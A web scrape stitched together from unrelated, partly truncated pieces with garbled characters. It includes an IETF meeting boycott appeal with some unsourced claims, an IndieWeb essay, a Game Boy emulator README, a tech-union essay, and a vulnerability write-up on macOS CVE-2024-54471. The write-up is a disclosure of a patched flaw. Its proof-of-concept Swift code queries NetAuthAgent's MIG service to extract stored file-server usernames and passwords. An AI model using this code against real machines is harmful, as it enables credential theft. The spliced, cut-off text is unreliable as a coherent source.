            They say:
        </p>
        <p>
                <em>"... it would be inappropriate to make any change without clear evidence of a direct issue"</em>
            </p>
        <p>
            However, the threat is real:
        </p>
        
        <p>
            The IETF Administration LLC has decided to continue to hold meetings in the US,
            in spite of significant threats to the safety of the community in traveling there.
            As an Internet community we strive to include everyone. Holding a meeting in the
            US is incompatible with our values.
            We call on the IETF community to refuse to travel to the 127<sup>th</sup> IETF meeting,
            to be held in San Francisco.
        </p>

        <h2>The US is dangerous</h2>
        <p>
            For many, the US was already a country for which it was not safe to travel to.
            But now, it is an actively hostile state to almost anyone travelling there.
        </p>
        <p>
            'Surely this won't affect me; I'm white, male, and European?' Think again.
            Here are the examples we know about of people being detained at the US border,
            and put into camps:
        </p>
        <ul>
            <li>A French scientist was deported for holding views critical of the Trump administration.

            <li>A Welsh backpacker was detained for 19 days. Source:
                <a href="https://www.bbc.com/news/articles/cly67j35y99o">BBC News</a>.
            </li>
            <li>A Canadian actor was detained for 2 weeks. Source:
                <a href="https://www.theguardian.com/us-news/2025/mar/18/canadian-actor-jasmine-mooney-detained-mexico-border">The Guardian</a>.
            </li>
            <li>A German engineer with permanent residency in the US (Green Card) is currently being detained. Source:
                <a href="https://www.theguardian.com/us-news/2025/mar/18/germany-investigates-after-national-with-green-card-arrested-at-us-border">The Guardian</a>.
            </li>
            <li>Two German tourists were held for two weeks and nearly two months, respectively. Source:
                <a href="https://www.dw.com/en/germany-monitoring-us-detentions-of-its-citizens/a-71952116">Deutsche Welle</a>.
            </li>
        </ul>
        <p>
            There are undoubtedly more cases we do not know about.
            These people are being held in utterly inhumane conditions, often without access to appropriate
            medical care, legal representation, food, nor even a bed. Some have been tortured.
        </p>
        <p>
            Beyond problems at the border, the current Secretary for Health and Human Services - Robert F. Kennedy Jr. -
            has said that he will send those with ADHD to camps. Source:

            Even if attendees get through the border, their safety during the meeting cannot be guaranteed.
        </p>
        <h2>'We can't just cancel meeting!'</h2>
        <p>
            We can, and we should.
        </p>
        <p>
            <a href="https://www.rfc-editor.org/rfc/rfc8718.html#RFC8711">RFC 8718</a> sets the
            criteria for the selection of a meeting venue for the IETF meetings. Amongst the <i>core</i> values listed
            is that of inclusiveness. Specifically, the IETF should:
        </p>
        <p>
                Avoid meeting in countries with laws that effectively exclude people on the basis of race, ethnicity,
                religion, gender, sexual orientation, national origin, citizenship, or gender identity.
            </p>
        <p>
            Additionally, <a href="https://www.rfc-editor.org/rfc/rfc9137.html">RFC 9137</a>
            sets the conditions on cancelling/relocating IETF meetings. Amongst examples of situations that should
            trigger a meeting cancellation are:
        </p>
        <div>
            <ul>
                <li>War, civil unrest, or a public health crisis could make a meeting unsafe and/or result in widespread
                    national or corporate travel bans.
                </li>
                <li>Changes in visa policies or other unexpected governmental restrictions might make the venue
                    inaccessible to numerous attendees.

  There's a corner of the Internet where people have been reclaiming
  their digital independence by hosting their own websites and
  promoting the idea of owning your own content‚Äîit's called the
  IndieWeb.  This community has its
  own <a href="https://indieweb.org/">website</a>, IRC channels,
  social media presence, etc.  This movement promotes the idea that
  individuals should control their own digital presence through
  personal websites.  But every time this topic comes up in online
  discussions, someone inevitably claims that the IndieWeb hasn't
  taken off!

  hasn't taken off because most people buy their vegetables at the
  supermarket.  The IndieWeb doesn't need to "take off" to be valuable

  browser render that code into a vibrant web page full of colours and
  images felt like an art form.  It was doubly fun to find other
  netizens who shared that same joy of maintaining and publishing
  their websites.  The IndieWeb is about preserving that hacker
  culture where websites are crafted and hosted not for mass appeal
  but for the sheer joy of creation and sharing with like-minded
  individuals.
</p>
<p>
  The IndieWeb doesn't need to go mainstream to be meaningful.  It's a
  celebration of a more personal, decentralised, and creative world
  wide web.  For those of us who still care about these values, it is
  already meaningful.

  Retro Boy is a simple Game Boy emulator written in Rust that can be played on the web. <a href="https://smparsons.github.io/retroboy" rel="nofollow">Try it here.</a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Introduction</h2><a id="user-content-introduction" aria-label="Permalink: Introduction" href="#introduction"></a></p>
<p dir="auto">Retro Boy is a cycle-accurate Game Boy emulator written in Rust. It uses <code>wasm-pack</code> to translate the Rust code into WebAssembly so it can be played on the web. The web frontend then uses Web Audio API and HTML Canvas for audio and graphics. It also leverages the browser's local storage to persist cartridge RAM data for battery-backed MBC cartridges.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>Accurate CPU that passes all <a href="https://github.com/adtennant/GameboyCPUTests">JSON CPU tests</a></li>
<li>Accurate audio emulation</li>
<li>Graphics emulation built using a scanline-based renderer</li>
<li>MBC1, MBC3, MBC5, and HuC1 support</li>
<li>RTC support for MBC3 cartridges</li>
<li>Cartridge RAM that persists to browser local storage for battery-backed cartridges</li>
<li>Support for GameShark or GameGenie cheats</li>
<li>A web frontend that supports:
<ul dir="auto">
<li>Fullscreen mode</li>
<li>Pausing/resuming</li>
<li>Selectable monochrome or color modes</li>
<li>Customizable key map for game controls</li>
<li>Management and enabling/disabling of game cheat codes</li>
<li>A mobile-friendy responsive design</li>
</ul>
</li>
</ul>

<p dir="auto">To compile the implementation to WebAssembly, you will first need to install wasm-pack with the command <code>cargo install wasm-pack</code> if you haven't done so already. Then, run <code>sh ./build-wasm.sh</code> to build the core project and generate the Javascript binding code in the web frontend directory.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Web Frontend</h2><a id="user-content-web-frontend" aria-label="Permalink: Web Frontend" href="#web-frontend"></a></p>
<p dir="auto">The web frontend for this emulator is a React/TypeScript app designed with Material UI. It is located in the frontends/web folder. The UI provides the ability to load a ROM as well as play, pause, or reset the emulator. It also provides a fullscreen mode.</p>
<p dir="auto">To run the web frontend:</p>
<ol dir="auto">
<li>Compile the Rust code to WebAssembly and generate the Javascript binding code as described in the "How to Compile to WebAssembly" section.</li>
<li>When the binding code is generated, it will be added to the frontends/web/src/core directory.</li>
<li>Run <code>yarn install</code> in the frontends/web directory to install all dependencies.</li>
<li>Run <code>yarn start</code> in the same directory to run the application locally.</li>

<div id="readability-page-1" class="page"><div id="main">
        <h2>The Burnout Machine</h2>
        <p><i>Originally written by Biozombie, published in 2600 Hacker Quarterly, Autumn 2024</i></p>
        <p>
            Let‚Äôs get real for a minute: the tech industry loves to sell us on the myth of the "dream
            job."
            You
            know
            the
            pitch - beanbags in the office, free kombucha on tap, and "Agile" processes that are supposed to
            make
            everything
            more flexible, more efficient. But the reality? It‚Äôs a meat grinder that chews up developers,
            sysadmins,
            and
            infosec pros and spits them out the other side - burnt out, disillusioned, and disposable.
        </p>
        <p>
            We‚Äôre living in a world where billion dollar tech companies expect us to live and breathe code,
            demanding
            80
            hour weeks under the guise of "passion." And what do we get in return? Burnout, anxiety, and the
            constant
            threat
            of layoffs. It‚Äôs time to face facts: this industry is not your friend. It‚Äôs a machine, and
            unless we
            start
            organizing, it‚Äôs going to keep grinding us down. It‚Äôs time to talk about unionizing tech jobs.
        </p>
        <p>
            Remember when Agile was supposed to save us all? Flexible sprints, self-organizing teams - yeah, right. In
            practice, Agile has been twisted into a tool for management to push us harder and faster. They say
            it‚Äôs
            about
            "responding to change over following a plan," but let‚Äôs be honest - it‚Äôs about dangling
            more
            carrots
            and keeping
            us on a treadmill that never stops. The sprint becomes a marathon, and we‚Äôre the ones paying the
            price.

        </p>
        <p>
            And then there‚Äôs burnout. We‚Äôre in an industry where burnout isn‚Äôt just common -
            it‚Äôs
            expected. If you‚Äôre not
            pulling all-nighters, you‚Äôre "not committed." If you‚Äôre not answering Slack messages at
            midnight,
            you‚Äôre "not a
            team player." This culture is toxic, and it‚Äôs only getting worse. The relentless churn of
            projects,
            the
            constant
            pressure to innovate, and the ever-present threat of obsolescence create a perfect storm of stress. And
            what‚Äôs
            the industry‚Äôs solution? A mindfulness app and a lecture on work-life balance. Give me a break.
        </p>
        <p>
            Let‚Äôs talk about job security - because there isn‚Äôt any. The tech industry loves to hype itself
            as a
            meritocracy, where the best and the brightest rise to the top. But in reality, it‚Äôs a meat market. As
            soon
            as
            you‚Äôre not "on the cutting edge," you‚Äôre out. Outsourcing, contract work, gig economy
            bullshit -
            it‚Äôs all
            designed to keep us insecure, to keep us grinding away at the next big thing with no guarantee that
            we‚Äôll
            have a
            job next week, next month, or next year.
        </p>
        <p>
            Companies love to brag about their innovation, but the real innovation is finding new ways to make us
            disposable. Permanent employment? That‚Äôs for suckers. Why pay benefits and offer job security when
            they
            can
            churn through contractors and freelancers like cheap code? And don‚Äôt get me started on those
            non-compete
            clauses
            - designed to keep you locked down and terrified to make a move that might actually be good for your career.
        </p>
        <p>
            And let‚Äôs not forget the ethical side of this equation. We‚Äôre being asked to build the future,
            to
            develop AI,
            blockchain, and all the other buzzword technologies that are supposed to change the world. But at what cost?
            How
            many of us have been forced to work on projects that make us sick to our stomachs - surveillance tech, data
            mining tools, algorithms that reinforce social biases - because we don‚Äôt have the power to say no?
        </p>
        <p>
            That‚Äôs the kicker. We‚Äôre the ones building the damn future, but we have no say in how it‚Äôs
            built. We don‚Äôt get
            to decide whether our code is used for good or for evil. And as long as we‚Äôre isolated, as long as
            we‚Äôre afraid
            to speak up because we might lose our jobs, nothing will change.
        </p>
        <p>
            This industry isn‚Äôt going to fix itself. The billionaires at the top aren‚Äôt going to suddenly
            grow a
            conscience,
            and they aren‚Äôt going to give us the power to push back. That power has to come from us - from
            organizing,
            from
            resisting, from breaking - unless we organize, unless we unionize.
        </p>
        <p>
            Unionizing isn‚Äôt just about getting better pay or benefits (though we desperately need both).
            It‚Äôs
            about taking
            back some control. It‚Äôs about having a say in how we work, what we work on, and how we‚Äôre
            treated.
            It‚Äôs about
            saying no to the endless churn, the burnout culture, the gig economy bullshit.
        </p>
        <p>
            And don‚Äôt let anyone tell you it‚Äôs impossible. The Alphabet Workers Union at Google?
            They‚Äôre
            showing us it can
            be done. They‚Äôre standing up to one of the biggest companies in the world and saying,
            "Enough." We
            need
            more of
            that. We need to take that energy and spread it across the industry - across all the companies that are
            profiting off our sweat and tears.
        </p>
        <p>
            Hackers, we‚Äôve always been about more than just code. We‚Äôve been about freedom - freedom of
            information, freedom
            from control. Unionizing is the next logical step. It‚Äôs about taking the hacker ethos into the
            workplace,
            about
            organizing to protect ourselves and each other.
        </p>
        <ul>
            <li><strong>Start the Conversation:</strong> Talk to your coworkers. Break the silence. The first step to
                organizing is
                realizing you‚Äôre not alone.
            </li>
            <li><strong>Support Existing Efforts:</strong> If you‚Äôre in a company where union efforts are already
                underway, get
                involved.
                If not, start thinking about how you can start one.
            </li>
            <li><strong>Use Your Skills:</strong> We‚Äôre hackers - we know how to communicate securely, how to
                organize without
                being
                detected. Let‚Äôs use those skills to build something real, something that can stand up to the
                powers that
                be.</li>
            <li><strong>Push for Ethics:</strong> Let‚Äôs make sure that any union platform we build isn‚Äôt
                just about wages and
                hours, but
                about ethics too. We need to have a say in what we‚Äôre building and how it‚Äôs used.</li>
        </ul>
        <p>
            The tech industry is a runaway train, and if we don‚Äôt do something soon, we‚Äôre going to get run
            over. The
            burnout, the job insecurity, the nightmares - it‚Äôs all going to keep getting worse unless we take a
            stand.
            Unionizing isn‚Äôt just a nice idea - it‚Äôs a necessity.
        </p>
        <p>
            So let‚Äôs do what hackers do best: let‚Äôs disrupt. Let‚Äôs take the tools they‚Äôve given
            us, the skills we‚Äôve
            honed, and use them to build something better. Let‚Äôs unionize. Let‚Äôs take back our industry,
            take back our
            jobs, and take back our futures.
        </p>
        <p>
            The future of tech is being written right now, and it‚Äôs up to us to decide what kind of story it will
            be.
            Let‚Äôs make it a story we can be proud of.
        </p>

    <h2>Introduction</h2>
    <p>This article discusses a vulnerability, <b>CVE-2024-54471</b>, that was patched as part of the <a href="https://support.apple.com/en-us/100100">Apple security releases</a>: <b>macOS Sequoia 15.1, macOS Sonoma 14.7.1, and macOS Ventura 13.7.1</b> (all released on October 28th, 2024). If you use a macOS device and are not on one of these updated versions: <strong><em>update now!</em></strong></p>
    <p>This article is going to start with a lot of setup. I need to lay out some definitions and explain several concepts before jumping into the actual exploitation details. If you want, you can <a target="_self" href="#exploitation-time">skip to the juicy exploitation info.</a> For everyone else, thank's for coming along for the ride! Let me start by explaining inter-process communication on macOS.</p>
    <h2>What is a Kernel?</h2>
    <p>In an operating system, the code responsible for communicating with hardware and presenting a multi-tasking model to the applications (among many other things) is called the <b>kernel.</b> When code is executed in the kernel, it is said to be in <b>kernel space,</b> while code that is executed outside of the kernel (i.e. most applications) is said to be in <b>user space.</b> The separation between user space and kernel space is often an important security barrier.</p>
    <p>The kernel for macOS (and pretty much all Apple OS's) is known as <b><a href="https://github.com/apple-oss-distributions/xnu/tree/main">XNU.</a></b> XNU is a hybrid kernel, containing parts of the <abbr title="Berkeley Software Distribution">BSD</abbr> kernel and its variants, as well as a (now heavily-modified) variant of the Mach kernel. Interestingly, it appears that Apple is one of the only organizations out there that is still actively maintaining a Mach kernel variant. While the Free Software Foundation's GNU Hurd kernel is based on their own variant called GNU Mach, development on the GNU Hurd kernel project is very minimal today.</p>
    <h2>A (Not-So)-Brief History of Mach</h2>
    <p>The history of the Mach kernel is deeply entangled with <a href="https://en.wikipedia.org/wiki/Unix_wars">the Unix wars of the 80's and 90's,</a> with multiple organizations and groups working on it and using it, often in overlapping time periods. As such, there is not really a clean well-delineated timeline from the start of Mach to now. Additionally, certain historical notes don't have easily-found primary sources, but are repeated often enough in secondary and tertiary sources to be considered trustworthy. I have done my best to fact-check this section while also linking to primary sources (or as close as I could get) where important.</p>
    <p>Mach started life as <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/mach.html"><q>an operating systems research project of the Carnegie Mellon University School of Computer Science from 1985 to 1994.</q></a> In 1989, the Open Software Foundation (now The Open Group) announced it would be using Mach in their upcoming <a href="https://en.wikipedia.org/wiki/OSF/1">OSF/1 operating system.</a> Unfortunately, I have been unable to find a direct link to this announcement, but I did find a few sentences of coverage of the announcement in <a href="https://archive.org/details/st-report-120/page/n7/mode/2up">an archive of a late-December issue of a online magazine called <cite>CPU NewsWire Online Magazine¬©</cite></a> (almost immediately after some coverage of late-1980's ransomware). The coverage of the announcement reads:</p>
    <blockquote>
      <pre><code>Cambridge, MA       The Open Systems Foundation, an organization funded by
-------------       several Unix vendors to develop a new Unix standard,
                    has announced that they may use the Mach OS (currently
                    used in the NeXT System) as the foundation for OSF/1,
                    their new systems software platform, instead of using
                    A/IX, IBM's version of Unix.

                    Mach provides better data security measures, inherent
                    support for multiprocessing, and compatibility with
                    Berkeley Unix.  But given that IBM's support of the
                    OSF was partly based on the OSF's use of A/IX, and
                    that much of the OSF's credibility depends on OSF/1
                    shipping by the announced date of July 1990....</code></pre>
    </blockquote>
    <p>It is unclear if the use of <q>Open Systems Foundation</q> is an error, or simply another name the OSF was known by at the time. I'm also not sure why the last sentence ends the way that it does, as despite the ellipses, it does appear to be the end of the coverage. More pertinent to the current topic, though, is the reference to <q>the NeXT System.</q> This is likely referring to <a href="https://en.wikipedia.org/wiki/NeXTSTEP">NeXTSTEP,</a> the operating system from <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> (the company that Steve Jobs founded after originally being ousted from Apple). This is the link that would ultimately bring Mach into what is now macOS.</p>
    <p>To say that NeXTSTEP simply used Mach would not tell the whole story. One of the original developers of Mach (and longtime friend of Steve Jobs) <a href="https://en.wikipedia.org/wiki/Avie_Tevanian">Avie Tevanian</a> worked with Steve as an executive at NeXT. When <a href="https://web.archive.org/web/19970301172356/http://live.apple.com/next/961220.pr.rel.next.html">NeXT was later acquired by Apple,</a><a></a> both Steve and Avie were given executive positions at their new parent company. Their NeXTSTEP operating system was developed into <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)">Darwin</a> the operating system basis for the next commercial release of Apple's Macintosh operating system: Mac OS X (now macOS).</p>
    <h2>Why Mach?</h2>
    <p>As mentioned previously, Mach was developed during the Unix wars of the 80's and 90's. Operating system vendors were all competing with each other to provide what they saw as the best way to design and use a Unix system. So what was it about Mach's Unix that was so special? What made it stand out amongst all the others? Really, it was the fact that <strong><em>it wasn't Unix</em></strong>... at least not <em>completely.</em></p>
    <p>In a paper submitted to the <cite><a href="https://archive.org/details/1986-proceedings-summer-tech-atlanta/page/93/mode/2up">USENIX 1986 Summer Technical Conference &amp; Exhibition</a></cite> (one of the earliest sources I could find), the developers laid out their vision and reasoning for creating Mach. They describe a landscape where inter-process communication had become frustratingly complex in Unix. What had started with the lowly file descriptor (a single handle that could allow a process to read, write, or seek) had turned into a confusing mess of streams, sockets, shared memory, and more. In an effort to simplify, they designed a system around Unix based on <em>four basic abstractions.</em></p>
    <h2>The Architecture of Mach</h2>
    <h3>The Four Abstractions</h3>
    <p>The four basic abstractions of Mach, as explain by the 1986 USENIX paper, are as follows (emphasis theirs):</p>
    <blockquote>
      <ol>
        <li>A <em>task</em> is an execution environment in which threads may run. It is the basic unit of resource allocation. A task includes a paged virtual address space and protected access to system resources (such as processors, port capabilities and virtual memory). The UNIX notion of a <em>process</em> is, in Mach, represented by a task with a single thread of control.</li>
        <li>A <em>thread</em> is the basic unit of CPU utilization. It is roughly equivalent to an independent program counter operating within a task. All threads within a task share access to all task resources.</li>
        <li>A <em>port</em> is a communication channel -- logically a queue for messages protected by the kernel. Ports are the reference objects of the Mach design. They are used in much the same way that object references could be used in an object oriented system. <em>Send</em> and <em>Receive</em> are the fundamental primitive operations on ports.</li>
        <li>A <em>message</em> is a typed collection of data objects used in communication between threads. Messages may be of any size and may contain pointers and typed capabilities for ports.</li>
      </ol>
    </blockquote>
    <p>Things certainly have changed in the several decades since this paper's release. For example, Mach threads actually pre-date <a href="https://en.wikipedia.org/wiki/Pthreads">POSIX threads</a> by nearly a decade (<a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html#thread-injection">this fact has lead to difficulty when attempting shellcode injection on macOS</a>). However, despite decades of other software changes, these four abstractions still underpin what Mach is today in modern macOS (and all other XNU-based Apple OS's).</p>
    <h3>Tasks, Ports, and Port Rights</h3>
    <p>Ports in Mach are interesting as the queues themselves really only exist in kernel space. Ports are exposed to user space as integers, similar to file descriptors. Except <em>not really.</em> What is actually exposed are port <em>rights,</em> with each task having a <q>port name space</q> containing <em>named</em> port rights (the integers themselves being referred to as the <q>names</q> of these rights). In some cases, two <em>different</em> rights to the <em>same</em> port may have the same <q>name</q> and are thus exposed to the owning task in user space with the same integer.</p>
    <p>Despite all this, in what appears to be an effort to use similarly-named API's in both kernel space and user space, these <q>named port rights</q> are often referred to simply as <q>ports</q> in user space, despite that being technically incorrect. It can all be very confusing, and only really starts to make sense after practice and immersing one's self in the world of Mach.</p>
    <p>Regarding rights themselves, the two main types of rights are <b>send rights</b> and <b>receive rights</b>. The kernel will allow multiple tasks to hold a send right to a port, but will only allow a single task to hold a receive right. This essentially creates a <b>client-server model</b> with a single server task receiving messages from multiple client tasks. As alluded to by the Mach paper above, a task is basically synonymous with a process. However, there is one special task in Mach, the kernel itself (more on that later).</p>
    <h3>The Structure of a Message</h3>
    <p>Conceptually, each Mach message contains, in order:</p>
    <ol>
      <li>A header,</li>
      <li>an optional body of descriptors,</li>
      <li>an arbitrary payload of bytes, and</li>
      <li>a kernel-appended trailer (only on received messages).</li>
    </ol>
    <p>Descriptors allow tasks to share out-of-line memory and even port rights with each other, with the kernel mapping addresses and manipulating port name spaces as necessary. The data in the arbitrary payload, on the other hand, is transferred as-is from the sending task to the receiving task.</p>
    <h3>How Tasks Get Send Rights</h3>
    <p>One might wonder how a task gets send rights to start with. macOS includes a <b>bootstrap server,</b> a Mach task that holds the receive right to a port to which every task holds a send right. The bootstrap server exposes the concept of <b>Mach services,</b> which are Mach servers registered with the bootstrap port with specific string names. Clients can ask the bootstrap server for send rights to these Mach services by name.</p>
    <h2>The Mach Interface Generator (MIG)</h2>
    <h3>Introduction</h3>
    <p>While Mach messages seem simple on their face, in practice they can involve a lot of manual memory management, which can be prone to issues. Perhaps in an effort to combat this, the authors of Mach included <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/doc/abstracts/mig.html"><abbr title="Mach Interface Generator">MIG</abbr>,</a> which provides a way to create functional interfaces around the sending and receiving of Mach messages.</p>
    <p>MIG is two parts: a pseudo-C IDL (interface definition language) and a compiler that takes in an IDL file and outputs multiple C files:</p>
    <ul>
      <li>a C source file to run on clients,</li>
      <li>a C source file to run on the server, and</li>
      <li>a C header file to use for both.</li>
    </ul>
    <p>These files define functions that handle the messages for the clients and server, exposing an <abbr title="remote procedure call">RPC</abbr>-style interface wherein a client needs only to call a function on its end and a server needs only to implement that function on its end. This makes for a much more memory-safe messaging experience.</p>
    <h3>The Technical Details</h3>
    <p>On a technical level, MIG is really just a wrapper around Mach messages. Each function is referred to as a <b>routine,</b> with a collection of routines being referred to as a <b>subsystem.</b> Each subsystem has a <q>subsystem number</q> of off which the routines will be indexed. These indexes are included in the <q>message ID</q> field of the message header. For example, in a subsystem with the number 18000, messages meant for the second routine will have a message ID of 18001 (the routines are zero-indexed).</p>
    <p>MIG is actually used heavily by the kernel. Mach itself doesn't have many system calls (specifically where a special CPU instruction is called and the kernel does something different based on a number in some register). The call to send or receive a message is, itself, a system call. However, many kernel API's you might think are system calls are merely MIG functions that send Mach messages to the kernel, which will perform the requested operation and return the result in a reply message.</p>
    <p>For communication across user space, MIG has been largely superseded by <a href="https://developer.apple.com/documentation/xpc">Apple's own XPC API's.</a> XPC (and really most IPC mechanisms on macOS) are also built on top of Mach messages, as they are the fundamental unit of inter-process communication in the Mach kernel. However, the XPC API's are much more developer-friendly than MIG. It's actually unclear if Apple ever truly supported third-party developers using MIG, as there does not appear to be any documentation from them on how to use it. However, they still do maintain <a href="https://github.com/apple-oss-distributions/bootstrap_cmds">their own version,</a> and there are a few legacy MIG servers still around.</p>
    <p>For those who are curious about the different IPC mechanisms in macOS, I highly recommend <a href="https://www.youtube.com/watch?v=D1jNCy7-g9k">Ian Beer's fantastic talk on the topic.</a> The video itself is nearly a decade old at this point, and many of the specific attack vectors he talks about (specifically those around memory manipulation) may not be entirely applicable today. However, it is still a very comprehensive look into the many different API's that processes have at their disposal on macOS to communicate with each other. Anyway, back to MIG!</p>
    <h2>Exploiting MIG Servers</h2>
    <h3>On the Security of MIG Servers</h3>
    <p>You might notice the lack of security measures native to MIG. What is to stop a task from getting a send right to a MIG server and sending it the same messages that the MIG-compiled client code would, ultimately calling the remote routines on the server? There are ways a MIG server can verify the sender of a message. But if it neglects to do so, <strong><em>any task with a send right can call routines on the MIG server.</em></strong></p>
    <h3>Finding MIG Servers</h3>
    <p>But how would you find MIG servers to exploit? This is where <a href="https://github.com/blacktop/ipsw">the <code>ipsw</code> <abbr title="command-line interface">CLI</abbr> tool from blacktop</a> comes in very handy. The code that MIG compiles, almost as a rule, uses the specific symbol <a><code>NDR_record</code></a> as the first field of every payload. It appears this symbol is meant to convey information on how certain primitives (such as characters and integers) are represented on the sending task.</p>
    <p>The interesting thing about this is that I've <em>never</em> come across a MIG server that actually uses that field of the payload when parsing received messages. In spite of this, <code>NDR_record</code> is still used in essentially all messages. Since it is an external symbol, this makes it easy to find binaries that use it. The <code>ipsw</code> CLI includes a subcommand that, when pointed to a <code>.ipsw</code> file (an update package for Apple OS's), you can search for binaries that import a specific symbol. To find binaries that use the <code>NDR_record</code> symbol, you can run:</p>
    <pre><code>ipsw macho search /path/to/update.ipsw -m "NDR_record"</code></pre>
    <p>An important thing to note is that this will find both MIG servers and <em>MIG clients</em> (some binaries are even both a MIG client and a MIG server). However, it is fairly easy to tell the difference between client and server code once a binary is opened in a disassembler or decompiler. I may publish a more specific follow-up article detailing how to reverse MIG servers.</p>
    <h2 id="exploitation-time">Exploitation Time!</h2>
    <h3>Introducing NetAuthAgent</h3>
    <p><b>NetAuthAgent</b> is a daemon on macOS (more specifically a <q>user agent,</q> as <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">the OS documentation delineates between the two terms</a>) that is responsible for handling the credentials for file servers (FTP, Samba, WebDAV, etc.). Before this vulnerability was patched, you could send a message to NetAuthAgent asking for the credentials to any server, and it would just <strong><em>give them to you.</em></strong></p>
    <h3>How NetAuthAgent Works</h3>
    <p>When <a href="https://support.apple.com/guide/mac-help/connect-mac-shared-computers-servers-mchlp1140/mac">accessing a file sever through Go -&gt; Connect To Server in Finder</a> a dialog box like the one below might appear. This dialog is actually coming from NetAuthAgent (or perhaps a sibling process of NetAuthAgent). If the user opts to check the box to remember the password, the credentials are stored in the macOS <b>keychain.</b></p>
    <img alt="A password prompt with the phrase 'No one can see this, right?' in the name field. There is a checkbox to save the password to the macOS keychain." src="https://wts.dev/posts/password-leak/password-dialog.png" height="700">
    <h4>The macOS Keychain</h4>
    <p>It's important to understand that NetAuthAgent itself did not (and does not) store the credentials directly. The macOS keychain is essentially a central secrets manager. NetAuthAgent uses this centralized location to store the credentials. Apple seems to downplay the importance of the keychain, with <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac">the documentation for their GUI Keychain Access app</a> describing it as merely a way to <q>manage certificates.</q> The OS will also attempt to direct users to the Passwords app when users open the Keychain Access app:</p>
    <img alt="A dialog box titled 'Manage Your Passwords in the New Passwords App' that reads 'Use the Passwords app to manage your passwords and passkeys, set up verification codes, and view security recommendations to keep your accounts safe.' The primary action button reads 'Open Passwords' and the secondary action button reads 'Open Keychain Access'. A check box allows the user to tell the OS 'Do not show this message again.'" src="https://wts.dev/posts/password-leak/passwords-popup.png" height="800">
    <p>In reality, the keychain is much more than Apple would suggest. Many applications, including NetAuthAgent, use it to store secrets. It's a fairly well-designed system, with each keychain item having its own access control list. This generally blocks applications from accessing secrets they should not have access to. However, if a process were to expose a mechanism for other processes to essentially proxy keychain queries through it, that can undermine the security of the whole system.</p>
    <h4>NetAuthAgent's MIG Server</h4>
    <p>NetAuthAgent exposes a MIG server available to lookup from the bootstrap server under the name <code>com.apple.netauth.user.gui</code>. The server exposed routines to read, create, and even overwrite in some cases, file server credentials. None of the routines ever verified message senders before this patch.</p>
    <h3>Exploiting NetAuthAgent</h3>
    <h4>On Kass</h4>
    <p>While exploring the internals of XNU, I decided to develop <a href="https://github.com/nmggithub/Kass">Kass,</a> a security research tool written in Swift, to help me have a better time dealing with Mach messages. Kass has since expanded to cover much more than Mach messages, covering many more Mach API's in XNU as well as several of its BSD-layer kernel API's.</p>
    <p>The proof-of-concept code I am including here will be written with the help of this tooling. Most of the code will be presented with minimal comment, as if I had to explain all the intricacies of how Kass works, in addition to Swift syntax, this article would be much longer than it already is! If you're curious about how to use Kass, I encourage you to take a look through <a href="https://swiftpackageindex.com/nmggithub/Kass/v4.2.1/documentation/machcore">my documentation.</a></p>
    <h4>Building a MIG Client</h4>
    <p>
      Kass provides an easy way to define a MIG client with a service name and subsystem number (the <code>baseRoutineID</code> argument) like so:
    </p>
    <pre><code>class NetAuthAgentClient: Mach.MIGClient, Mach.PortInitializableByServiceName {
    convenience init() throws {
        try self.init(serviceName: "com.apple.netauth.user.gui", baseRoutineID: 40200)
    }

  ...
}</code></pre>
    <h4>Writing a Client Routine Handler</h4>
    <p>Keychain items on macOS have a metadata field that says what <q>class</q> an item is of. Routine 19 (message ID 40219) of NetAuthAgent allows clients to essentially proxy keychain queries for items with a class of <q><a href="https://developer.apple.com/documentation/security/ksecclassinternetpassword">internet password.</a></q> This is the class that NetAuthAgent uses for most file server credentials. The routine takes in an out-of-line data descriptor containing a serialized dictionary of arguments, and returns two out-of-line data descriptors containing the username and password.</p>
    <p>
      Note that the routine expects the size of the data in the descriptor to be sent along in the payload (even though the descriptor itself includes the size). This is because that is what the MIG-compiled client code does for this routine, so this code needs to emulate that behavior.
    </p>
    <pre><code>...

    func getInternetPassword(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil,
        username: String? = nil
    ) throws -&gt; (username: String, password: String) {
        struct InternetPasswordPayload: Mach.TrivialMessagePayload, Mach.MIGPayloadWithNDR {
            let NDR: NDR_record_t = NDR_record_t()
            let size: mach_msg_size_t
        }
        let plistData = self.serializeInternetPasswordOptions(
            scheme: scheme, host: host, port: port, path: path
        )
        let reply = try self.doRoutine(
            19,
            request: Mach.MIGRequest(
                descriptors: [
                    mach_msg_ool_descriptor_t(data: plistData)
                ],
                payload: InternetPasswordPayload(size: mach_msg_size_t(plistData.count))
            )
        )
        let username = String(
            data: (reply.body!.descriptors[0] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        let password = String(
            data: (reply.body!.descriptors[1] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        return (username, password)
    }

    ...</code></pre>
    <p>The code above calls <code>serializeInternetPasswordOptions</code> to serialize a dictionary so it can be sent in an out-of-line data descriptor. Below is the implementation for that helper function:</p>
    <pre><code>...

    private func serializeInternetPasswordOptions(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil
    ) -&gt; Data {
        var options: [String: Any] = [:]
        if let scheme = scheme { options["Scheme"] = scheme }
        options["Host"] = host
        if let port = port { options["AlternatePort"] = port }
        if let path = path { options["Path"] = path }
        return try! PropertyListSerialization.data(
            fromPropertyList: options, format: .binary, options: 0
        )
    }

    ...</code></pre>
    <h4>Finding Credentials To Query</h4>
    <p>The macOS keychain provides <a href="https://developer.apple.com/documentation/security/secitemcopymatching(_:_:)">API's to query for keychain items,</a> and these are what NetAuthAgent uses internally. Interestingly, these API's can often be used by unprivileged processes to get the <em>metadata</em> about keychain items, as long as they are not asking for the secret values themselves. The below defines a variable <code>netAuthAgentInternetPasswords</code> that will contain an array of keychain items that NetAuthAgent should be able to access.</p>
